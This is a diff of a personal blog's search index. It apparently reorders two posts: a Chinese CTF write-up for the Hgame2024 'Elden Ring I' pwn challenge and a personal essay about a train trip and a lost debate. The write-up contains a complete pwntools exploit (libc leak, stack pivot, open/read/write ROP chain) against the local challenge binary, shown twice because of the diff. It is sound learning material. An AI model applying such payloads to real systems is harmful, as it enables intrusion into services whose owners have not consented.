+                     src="/images/loading.svg"
+                     data-src="/z1nax5.github.io/pic/eldenring1/2.png"
+                      alt="img.png"
+                ><br>申请了100h空间写东西，但是允许你写130h，非常清楚的栈溢出，给了30h的操作空间</p>
+<p>所以大概思路就是要用orw这样也能读到flag,然后30h写不下,所以需要一块可写的地方，还有足够的长度和写的指令。</p>
+<p>看到vuln里面有read(),所以写的指令可以直接借这个。放orx的地方就选择可读可写的bss段，那么就要栈迁移一下。</p>
+<p>好，那么exp的思路应该是：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">第一次leave ret：溢出一下，改变rbp旧址，移动栈底，把read()的写入地址改成bss,回到read()</span><br><span class="line">第二次leave ret：借read（）把orw写进新的栈之后会经过leave ret,然后自然而然rsp找rbp,ret到栈顶。</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+<p>新的栈相当于全部都是可以利用的，所以基本不担心写不写得下orw。<br>然后来看需要的地址(除了ida能找到的和pwntools可以直接读到的)和代码片段：</p>
+<ul>
+<li>pop_rax_ret</li>
+<li>pop_rdi_ret</li>
+<li>pop_rsi_ret</li>
+<li>pop_rdx_ret</li>
+<li>open_addr</li>
+<li>read_addr</li>
+<li>write_addr</li>
+</ul>
+<p>然后去找了一下代码片段<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/z1nax5.github.io/pic/eldenring1/3.png"
+                      alt="img.png"
+                ><br>啊这根本不够用，而且知道open_addr也需要libc基址<br>所以显然再加一步泄露libc基址，啊因为这个题还是比较温柔的，vuln里一共就一个puts(),一个read(),很明显这个用过的puts()可以拿来got表泄露一下。<br>我们已经能够控制rdi了，30h也足够把puts()泄露了</p>
+<p>所以payload的思路就是：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次read:溢出泄露puts()拿到puts()的物理地址，回到函数</span><br><span class="line">    然后减去偏移泄露libc,算一下需要的地址，以及代码片段的位置</span><br><span class="line">第二次read:溢出改变rbp旧址，控制rax,回到read（）</span><br><span class="line">第三次read:写入orw</span><br></pre></td></tr></table></figure></div>
+<p>好的下面是exp</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#纯本地打的一次</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p=process(&quot;./vuln&quot;)</span><br><span class="line">elf=ELF(&quot;./vuln&quot;)</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">##ida里直接找的</span><br><span class="line">ret_add=0x40125B</span><br><span class="line">bss_add=0x404090</span><br><span class="line">##ROPgadget</span><br><span class="line">pop_rdi_ret=0x4013e3</span><br><span class="line"></span><br><span class="line">#第一次read</span><br><span class="line">payload=(0x108)*b&#x27;A&#x27;+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(ret_add)</span><br><span class="line">payload=payload.ljust(0x130,b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendafter(&quot;accord.&quot;,payload)      </span><br><span class="line">p.recvline()    </span><br><span class="line">p.recvline()  </span><br><span class="line"></span><br><span class="line">#算基址                              </span><br><span class="line">puts_add=u64(p.recvline()[:6].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">libc_base=puts_add-0x84420  ##0x84420是puts在libc里的偏移，这个东西有两种来法，写在后面力</span><br><span class="line">print(&quot;libc_base=&quot;,hex(libc_base),&quot;puts_add=&quot;,hex(puts_add))</span><br><span class="line"></span><br><span class="line">#算需要的地址</span><br><span class="line">pop_rax_ret=0x0000000000036174+libc_base</span><br><span class="line">pop_rsi_ret=0x000000000002601f+libc_base</span><br><span class="line">pop_rdx_ret=0x0000000000142c92+libc_base</span><br><span class="line">open_add=libc_base+libc.sym[&quot;open&quot;]</span><br><span class="line">read_add=libc_base+libc.sym[&quot;read&quot;]</span><br><span class="line">write_add=libc_base+libc.sym[&quot;write&quot;]</span><br><span class="line"></span><br><span class="line">#第二次read</span><br><span class="line">payload=0x100*b&#x27;a&#x27;</span><br><span class="line">payload+=p64(bss_add-0x8)##rbp</span><br><span class="line">payload+=p64(pop_rax_ret)</span><br><span class="line">payload+=p64(bss_add)</span><br><span class="line">payload+=p64(0x401282)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.sendafter(&quot;accord.&quot;,payload)</span><br><span class="line"></span><br><span class="line">#第三次read</span><br><span class="line">#orw 从0x404090开始</span><br><span class="line">payload1=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(0x404128)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0)</span><br><span class="line">payload1+=p64(open_add)</span><br><span class="line"></span><br><span class="line">payload1+=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(3)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0x404140) ##0x404128+hex(16)=0x404138</span><br><span class="line">payload1+=p64(pop_rdx_ret)</span><br><span class="line">payload1+=p64(0x100)</span><br><span class="line">payload1+=p64(read_add)</span><br><span class="line"></span><br><span class="line">payload1+=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(1)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0x404140)</span><br><span class="line">payload1+=p64(pop_rdx_ret)</span><br><span class="line">payload1+=p64(0x100)</span><br><span class="line">payload1+=p64(write_add)</span><br><span class="line">payload1+=b&#x27;flag\x00\x00\x00\x00&#x27;#0x404090+hex(19*8)=0x404128</span><br><span class="line">payload1+= p64(0)*16</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="一些问题复现与小知识"><a href="#一些问题复现与小知识" class="headerlink" title="一些问题复现与小知识"></a>一些问题复现与小知识</h3><h4 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h4><p>个人理解就是栈顶找栈底，然后把栈底的旧址改了就能把栈迁移走。</p>
+<p>那么第一次leave ret就是栈顶回到没有申请栈的时候，栈底移走<br>第二次leave ret就是栈顶到了新栈底的地方，控制流就跟着栈顶走了</p>
+<h6 id="迁移到了哪？0x404090"><a href="#迁移到了哪？0x404090" class="headerlink" title="迁移到了哪？0x404090"></a>迁移到了哪？0x404090</h6><p>原计划是要迁移到bss段，但是我看到ida上bss的开始其实还要更早<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/z1nax5.github.io/pic/eldenring1/4.png"
+                      alt="img.png"
+                ><br>而实际写进去的位置大概在prgend这里，呃呃查了一些资料感受不出来这俩有啥要可以区分的<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/z1nax5.github.io/pic/eldenring1/5.png"
+                      alt="img_1.png"
+                ><br>总之直接开调，先去vmmap里面只能看到数据段是从0x404000到0x405000很大一段<br>然后ida也能看到bss的起始地址，就试了一下把bss_add写得再小一点，是可以打通的</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">bss_add=0x404068</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#orw 0x404090</span><br><span class="line">payload1=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(0x404100)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0)</span><br><span class="line">payload1+=p64(open_add)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">payload1+=p64(0x404108)</span><br><span class="line">payload1+=p64(pop_rdx_ret)</span><br><span class="line">payload1+=p64(0x100)</span><br><span class="line">payload1+=p64(read_add)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">payload1+=p64(0x404108)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+<p>后来我又试了一下把orw写到data（0x404050开始）上在这个题目里也是可以打通的，不过再往前和got.plt（0x404000）开始就不ok了，应该是影响到了函数调用（？</p>
+<h4 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h4><p>这个东西之前接触过，但是和这次的调用逻辑不太一样，，，但是函数传参那套还是在的<br>emmm主要调试了一下这个第二个参数传的地址的变化，open要开的是’flag‘的地址，就是[add]&#x3D;’flag’,第一遍打通的时候其实没找准，主要是因为我用的最后一个gadget和参考的exp不一样长，然后填充长度也就不一样了。</p>
+<p>所以后来改了一下，然后把计算过程写在前面的exp里了，也用<code>tele</code>调试了几种不同的情况。</p>
+<h4 id="recv"><a href="#recv" class="headerlink" title="recv()"></a>recv()</h4><p>这个东西从我第一次打pwn到现在都在出问题（乐<br>首先这次是因为这个狗题puts(“…\n”)<br>然后recvline(keepends&#x3D;True)默认接收换行符，且是接收到换行符结束<br>recvuntil(delims, drop&#x3D;False),delims是字符串，drop表示是否丢弃中止标志<br>recv()接收指定字符长度</p>
+<h4 id="offset"><a href="#offset" class="headerlink" title="offset"></a>offset</h4><h6 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h6><p>这个相对libc的偏移是固定的，只是libc的基址会变，所以可以取一次调试得到的装载后的地址<code>puts_add</code>-这一次的基址就是每一次的偏移。<br>这个x指令我不是很会用，就用p凑合凑合了<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/z1nax5.github.io/pic/eldenring1/6.png"
+                      alt="img_2.png"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/z1nax5.github.io/pic/eldenring1/7.png"
+                      alt="img_3.png"
+                ><br>然后十进制转一下十六进制。。</p>
+<h6 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h6><p>但是我本来就在想，既然偏移是固定的，那pwntools为什么不能直接解析文件呢。<br>而且本来脚本就有：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">open_add=libc_base+libc.sym[&quot;open&quot;]</span><br><span class="line">read_add=libc_base+libc.sym[&quot;read&quot;]</span><br><span class="line">write_add=libc_base+libc.sym[&quot;write&quot;]</span><br></pre></td></tr></table></figure></div>
+<p>这种东西，他们的偏移不就直接得出来。<br>然后我就试了一下这个</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(hex(libc.sym[&#x27;puts&#x27;]))</span><br></pre></td></tr></table></figure></div>
+<p>返回0x84420，所以其实这玩意确实不用算。。</p>
+<h4 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h4><p>装了一个工具，解决我只能硬看的问题</p>
+<h4 id="一些其他小问题"><a href="#一些其他小问题" class="headerlink" title="一些其他小问题"></a>一些其他小问题</h4><p>调到这里大部分问题都没有了，比较可惜的是其实没有机会复现寒假出现的问题了，可能确实那个时候就是环境一开始因为各种问题就是配的烂，所以有很多莫名其妙的东西出现，现在这个环境是我五一的时候重装的，这一次从头到尾都配很丝滑，所以好像也没有换glibc,patchelf有问题等一系列的毛病。</p>
+<p>希望能早点做到一个需要换环境的题，因为这个我真不会。</p>
+<h3 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h3><p>动态调试其实最重要的是我现在能理解到ret和pop了，之前不知道为什么就是对这两条指令的接收度不高，所以有些问题感觉都是好像懂了好像没懂。也可能是因为虽然代码写得多，但其实没怎么在实践中接触栈，对于栈顶的理解也不够深刻maybe.</p>
 ]]></content>
       <tags>
-        <tag>喵喵</tag>
-        <tag>随笔</tag>
+        <tag>学习日志</tag>
+        <tag>Pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -499,90 +544,45 @@
       </tags>
   </entry>
   <entry>
-    <title>记录一次栈迁移|Hgame2024-Elden Ring I</title>
-    <url>/z1nax5.github.io/2024/05/24/%E6%87%92%E5%BE%97%E5%96%B7/</url>
-    <content><![CDATA[<p>( ºΔº )</p>
-<p>很有意义的一次做题，尤其对我这种。。</p>
-<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>按照流程应该先看一下保护和文件信息，但是因为我是知道答案找过程所以就略过。</p>
-<p>然后看ida,找一下洞<br><img  
+    <title>火车摇啊摇</title>
+    <url>/z1nax5.github.io/2024/05/07/%E4%BA%BA%E7%94%9F%E5%B0%8F%E6%BB%A1%EF%BC%8C%E6%97%A2%E6%98%AF%E5%9C%86%E6%BB%A1/</url>
+    <content><![CDATA[<p><em>_φ</em>_(．．)</p>
+<p>收到“杭电后勤生活”的推文，明天是小满，师生驿站有活动，还配上了“人生小满，既是圆满”的文案。</p>
+<p>一时感慨，想到之前想更的博客也没更，索性一并抒发了。</p>
+<h6 id="一"><a href="#一" class="headerlink" title="一"></a>一</h6><p>最先当说的应是高中生活，本就是这句“人生小满，既是圆满”一下把我的思绪拉到了高中。</p>
+<p>差不多去年今日，准备高考时买了一本作文书里面收录了一些和我调性相符还算认可的高考作文，这里还算认可的意思大概是说写得细腻，在限时考试的背景下我仍能从里面看到些许的文字的斟酌或者追求。</p>
+<p>扯远了，这样显得我写东西多清高了，不过文人相轻是常态嘛，也该轮到我清高清高了。</p>
+<p>那时读到有一篇议论文的立意就是“人生小满，既是圆满”，也一样是从节气、自然讲到人生，佐以中华传统文化等素材一道写的饱满充实。不过可能到现在我还是就记住了“人生小满”，也可能当时那些辞藻、结构、渲染就没看进去，当时神经衰弱（现在也神经衰弱）压力挺大的，也就只能看见“人生小满”。</p>
+<h6 id="二"><a href="#二" class="headerlink" title="二"></a>二</h6><p>说到压力大，我前段时间压力就还蛮大的，忙到天天被迫熬夜还看了两次凌晨四点的杭电，不过我还是忙里偷闲会写博客，反而五一忙完了就一直在睡觉或者打打游戏，总之称不上多有营养。</p>
+<p>在忙的时候，时常想着忙完了就狠狠更新博客，把这天上地下的都点评一番，我对象挺不能理解为什么我这么喜欢写博客，还要催他去开一个。除了可以偷窥他在干什么，对我而言博客的意义是这里的确是我可以把心剖开了的地方。这里是如同群聊一样的私域链接，也不会像群聊一样提示你谁更新了，后悔了也能直接撤了文章。我清楚地知道谁可能会看，我也不介意，能知道这个地址的朋友若是有心关心我，来看看我我也挺乐意的。</p>
+<h6 id="三"><a href="#三" class="headerlink" title="三"></a>三</h6><p>原本想要写的一篇，名字就叫“火车摇啊摇”，也就是现在这篇的名字。</p>
+<p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/pic/eldenring1/1.png"
+                     data-src="/z1nax5.github.io/pic/%E6%9D%AD%E5%B7%9E%E5%8D%97.png"
                       alt="img.png"
-                ><br>看到开了沙箱，禁用了一些系统调用<br>然后进函数看<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/pic/eldenring1/2.png"
-                      alt="img.png"
-                ><br>申请了100h空间写东西，但是允许你写130h，非常清楚的栈溢出，给了30h的操作空间</p>
-<p>所以大概思路就是要用orw这样也能读到flag,然后30h写不下,所以需要一块可写的地方，还有足够的长度和写的指令。</p>
-<p>看到vuln里面有read(),所以写的指令可以直接借这个。放orx的地方就选择可读可写的bss段，那么就要栈迁移一下。</p>
-<p>好，那么exp的思路应该是：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">第一次leave ret：溢出一下，改变rbp旧址，移动栈底，把read()的写入地址改成bss,回到read()</span><br><span class="line">第二次leave ret：借read（）把orw写进新的栈之后会经过leave ret,然后自然而然rsp找rbp,ret到栈顶。</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
-<p>新的栈相当于全部都是可以利用的，所以基本不担心写不写得下orw。<br>然后来看需要的地址(除了ida能找到的和pwntools可以直接读到的)和代码片段：</p>
-<ul>
-<li>pop_rax_ret</li>
-<li>pop_rdi_ret</li>
-<li>pop_rsi_ret</li>
-<li>pop_rdx_ret</li>
-<li>open_addr</li>
-<li>read_addr</li>
-<li>write_addr</li>
-</ul>
-<p>然后去找了一下代码片段<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/pic/eldenring1/3.png"
-                      alt="img.png"
-                ><br>啊这根本不够用，而且知道open_addr也需要libc基址<br>所以显然再加一步泄露libc基址，啊因为这个题还是比较温柔的，vuln里一共就一个puts(),一个read(),很明显这个用过的puts()可以拿来got表泄露一下。<br>我们已经能够控制rdi了，30h也足够把puts()泄露了</p>
-<p>所以payload的思路就是：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次read:溢出泄露puts()拿到puts()的物理地址，回到函数</span><br><span class="line">    然后减去偏移泄露libc,算一下需要的地址，以及代码片段的位置</span><br><span class="line">第二次read:溢出改变rbp旧址，控制rax,回到read（）</span><br><span class="line">第三次read:写入orw</span><br></pre></td></tr></table></figure></div>
-<p>好的下面是exp</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#纯本地打的一次</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p=process(&quot;./vuln&quot;)</span><br><span class="line">elf=ELF(&quot;./vuln&quot;)</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">##ida里直接找的</span><br><span class="line">ret_add=0x40125B</span><br><span class="line">bss_add=0x404090</span><br><span class="line">##ROPgadget</span><br><span class="line">pop_rdi_ret=0x4013e3</span><br><span class="line"></span><br><span class="line">#第一次read</span><br><span class="line">payload=(0x108)*b&#x27;A&#x27;+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(ret_add)</span><br><span class="line">payload=payload.ljust(0x130,b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendafter(&quot;accord.&quot;,payload)      </span><br><span class="line">p.recvline()    </span><br><span class="line">p.recvline()  </span><br><span class="line"></span><br><span class="line">#算基址                              </span><br><span class="line">puts_add=u64(p.recvline()[:6].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">libc_base=puts_add-0x84420  ##0x84420是puts在libc里的偏移，这个东西有两种来法，写在后面力</span><br><span class="line">print(&quot;libc_base=&quot;,hex(libc_base),&quot;puts_add=&quot;,hex(puts_add))</span><br><span class="line"></span><br><span class="line">#算需要的地址</span><br><span class="line">pop_rax_ret=0x0000000000036174+libc_base</span><br><span class="line">pop_rsi_ret=0x000000000002601f+libc_base</span><br><span class="line">pop_rdx_ret=0x0000000000142c92+libc_base</span><br><span class="line">open_add=libc_base+libc.sym[&quot;open&quot;]</span><br><span class="line">read_add=libc_base+libc.sym[&quot;read&quot;]</span><br><span class="line">write_add=libc_base+libc.sym[&quot;write&quot;]</span><br><span class="line"></span><br><span class="line">#第二次read</span><br><span class="line">payload=0x100*b&#x27;a&#x27;</span><br><span class="line">payload+=p64(bss_add-0x8)##rbp</span><br><span class="line">payload+=p64(pop_rax_ret)</span><br><span class="line">payload+=p64(bss_add)</span><br><span class="line">payload+=p64(0x401282)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.sendafter(&quot;accord.&quot;,payload)</span><br><span class="line"></span><br><span class="line">#第三次read</span><br><span class="line">#orw 从0x404090开始</span><br><span class="line">payload1=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(0x404128)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0)</span><br><span class="line">payload1+=p64(open_add)</span><br><span class="line"></span><br><span class="line">payload1+=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(3)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0x404140) ##0x404128+hex(16)=0x404138</span><br><span class="line">payload1+=p64(pop_rdx_ret)</span><br><span class="line">payload1+=p64(0x100)</span><br><span class="line">payload1+=p64(read_add)</span><br><span class="line"></span><br><span class="line">payload1+=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(1)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0x404140)</span><br><span class="line">payload1+=p64(pop_rdx_ret)</span><br><span class="line">payload1+=p64(0x100)</span><br><span class="line">payload1+=p64(write_add)</span><br><span class="line">payload1+=b&#x27;flag\x00\x00\x00\x00&#x27;#0x404090+hex(19*8)=0x404128</span><br><span class="line">payload1+= p64(0)*16</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="一些问题复现与小知识"><a href="#一些问题复现与小知识" class="headerlink" title="一些问题复现与小知识"></a>一些问题复现与小知识</h3><h4 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h4><p>个人理解就是栈顶找栈底，然后把栈底的旧址改了就能把栈迁移走。</p>
-<p>那么第一次leave ret就是栈顶回到没有申请栈的时候，栈底移走<br>第二次leave ret就是栈顶到了新栈底的地方，控制流就跟着栈顶走了</p>
-<h6 id="迁移到了哪？0x404090"><a href="#迁移到了哪？0x404090" class="headerlink" title="迁移到了哪？0x404090"></a>迁移到了哪？0x404090</h6><p>原计划是要迁移到bss段，但是我看到ida上bss的开始其实还要更早<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/pic/eldenring1/4.png"
-                      alt="img.png"
-                ><br>而实际写进去的位置大概在prgend这里，呃呃查了一些资料感受不出来这俩有啥要可以区分的<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/pic/eldenring1/5.png"
-                      alt="img_1.png"
-                ><br>总之直接开调，先去vmmap里面只能看到数据段是从0x404000到0x405000很大一段<br>然后ida也能看到bss的起始地址，就试了一下把bss_add写得再小一点，是可以打通的</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">bss_add=0x404068</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#orw 0x404090</span><br><span class="line">payload1=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(0x404100)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0)</span><br><span class="line">payload1+=p64(open_add)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">payload1+=p64(0x404108)</span><br><span class="line">payload1+=p64(pop_rdx_ret)</span><br><span class="line">payload1+=p64(0x100)</span><br><span class="line">payload1+=p64(read_add)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">payload1+=p64(0x404108)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
-<p>后来我又试了一下把orw写到data（0x404050开始）上在这个题目里也是可以打通的，不过再往前和got.plt（0x404000）开始就不ok了，应该是影响到了函数调用（？</p>
-<h4 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h4><p>这个东西之前接触过，但是和这次的调用逻辑不太一样，，，但是函数传参那套还是在的<br>emmm主要调试了一下这个第二个参数传的地址的变化，open要开的是’flag‘的地址，就是[add]&#x3D;’flag’,第一遍打通的时候其实没找准，主要是因为我用的最后一个gadget和参考的exp不一样长，然后填充长度也就不一样了。</p>
-<p>所以后来改了一下，然后把计算过程写在前面的exp里了，也用<code>tele</code>调试了几种不同的情况。</p>
-<h4 id="recv"><a href="#recv" class="headerlink" title="recv()"></a>recv()</h4><p>这个东西从我第一次打pwn到现在都在出问题（乐<br>首先这次是因为这个狗题puts(“…\n”)<br>然后recvline(keepends&#x3D;True)默认接收换行符，且是接收到换行符结束<br>recvuntil(delims, drop&#x3D;False),delims是字符串，drop表示是否丢弃中止标志<br>recv()接收指定字符长度</p>
-<h4 id="offset"><a href="#offset" class="headerlink" title="offset"></a>offset</h4><h6 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h6><p>这个相对libc的偏移是固定的，只是libc的基址会变，所以可以取一次调试得到的装载后的地址<code>puts_add</code>-这一次的基址就是每一次的偏移。<br>这个x指令我不是很会用，就用p凑合凑合了<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/pic/eldenring1/6.png"
-                      alt="img_2.png"
-                ><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/pic/eldenring1/7.png"
-                      alt="img_3.png"
-                ><br>然后十进制转一下十六进制。。</p>
-<h6 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h6><p>但是我本来就在想，既然偏移是固定的，那pwntools为什么不能直接解析文件呢。<br>而且本来脚本就有：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">open_add=libc_base+libc.sym[&quot;open&quot;]</span><br><span class="line">read_add=libc_base+libc.sym[&quot;read&quot;]</span><br><span class="line">write_add=libc_base+libc.sym[&quot;write&quot;]</span><br></pre></td></tr></table></figure></div>
-<p>这种东西，他们的偏移不就直接得出来。<br>然后我就试了一下这个</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(hex(libc.sym[&#x27;puts&#x27;]))</span><br></pre></td></tr></table></figure></div>
-<p>返回0x84420，所以其实这玩意确实不用算。。</p>
-<h4 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h4><p>装了一个工具，解决我只能硬看的问题</p>
-<h4 id="一些其他小问题"><a href="#一些其他小问题" class="headerlink" title="一些其他小问题"></a>一些其他小问题</h4><p>调到这里大部分问题都没有了，比较可惜的是其实没有机会复现寒假出现的问题了，可能确实那个时候就是环境一开始因为各种问题就是配的烂，所以有很多莫名其妙的东西出现，现在这个环境是我五一的时候重装的，这一次从头到尾都配很丝滑，所以好像也没有换glibc,patchelf有问题等一系列的毛病。</p>
-<p>希望能早点做到一个需要换环境的题，因为这个我真不会。</p>
-<h3 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h3><p>动态调试其实最重要的是我现在能理解到ret和pop了，之前不知道为什么就是对这两条指令的接收度不高，所以有些问题感觉都是好像懂了好像没懂。也可能是因为虽然代码写得多，但其实没怎么在实践中接触栈，对于栈顶的理解也不够深刻maybe.</p>
+                ></p>
+<p>许久不坐绿皮车了，但我以前坐的实在多，以至于一上车闻到那股淡淡烟草味混合着微生物腐臭味的气息时，回忆能一下冲垮了我推论的思路。下午的正赛有点难打，我们是劣势持方，从结果评委的点评来看，我们的言辞需要更精准，论证需要更多环节，要将辩题外的东西来围猎对面，也需要讲辩题外的东西为什么可以讲。对于正方，他们只要简单的讲讲自己就好。</p>
+<p>我从没有为一场辩论模辩过三次，写四五千字的稿子，甚至于失掉辩论的自信。</p>
+<p>在此之前，我一直认为，辩论是一件我擅长却不敢兴趣的事，如果生活不冲突的话，在自己擅长的地方大杀四方当然畅快，但是如果冲突了，那我当然不会忙不感兴趣的事了。</p>
+<p>不过这“最后一场辩论”，让我连是否擅长辩论都不太确信了。或许是我的前置位队友不够给力，让我每次发言都很难受；或许是来找我的学姐言辞凛然，让我总觉得自己做得不够好；或许是真的就是太难了，这个辩题在网上你都找不到一场我方持方打赢的视频…………</p>
+<p>这“最后一场辩论”里我的表现，自我感觉是不好的。我问学长，“感觉我今天打的还没新生杯的时候好”，学长说，“怎么会呢，辩论肯定是越打越好的”。</p>
+<p>火车摇啊摇，胡思乱想。</p>
+<p>绿皮车的气味真是难闻，坐了几十上百次我还是没适应。如果不是我把一周半准备三个辩题误以为一周半准备一个辩题，我应当也不会接下这场全国范围的竞技辩，也不会退掉五一回上海的车票，而买了偏远的杭州南为了确保一定能在下午前到嘉兴比赛。</p>
+<p>杭州南，好像都是绿皮车。</p>
+<p>我记得以前在嘉兴-上海的绿皮车上，我也总爱胡思乱想，过去想想没写完的作业就像现在想想没推完的论，就连不知所措和时间紧迫的焦虑也大差不差。</p>
+<h6 id="四"><a href="#四" class="headerlink" title="四"></a>四</h6><p>输了辩论，但和辩论队的纠葛很难完全了断。</p>
+<p>协会的学长其实都觉得这是没什么大不了的小事，脸皮厚一点就好了。</p>
+<p>但我是个耳根子软的人，旁人随意说两句，我很容易就在意。就像现在准备转专业一样，原本坚定了一个半学期，但是有人在我面前真诚的说上两句，加上一个我确实没考虑过的角度，我就很听劝的开始咨询转专业。</p>
+<p>这种无条件无意义的在意，除了让我费神之外，也给我加上了一层社交体面的被动。“火车摇啊摇”，其实是朋友圈的真心话版，而朋友圈，只是宣告离别辩论的社交仪式。</p>
+<h6 id="五"><a href="#五" class="headerlink" title="五"></a>五</h6><p><em>*上传的时候发现这里被我手滑空格删掉了，那就这样吧，本来这段写的也不好,弥补的事少做一点，前进的事多做一点</em></p>
+<h6 id="六"><a href="#六" class="headerlink" title="六"></a>六</h6><p>人生小满，既是圆满。</p>
+<p>有感触还是因为觉得最近也算人生小满，说人生太大了，要把眼光放的局限一点，再局限一点。</p>
+<p>我5号染了个还不错的头，小满。</p>
 ]]></content>
       <tags>
-        <tag>学习日志</tag>
-        <tag>Pwn</tag>
+        <tag>喵喵</tag>
+        <tag>随笔</tag>
       </tags>
   </entry>
 </search>
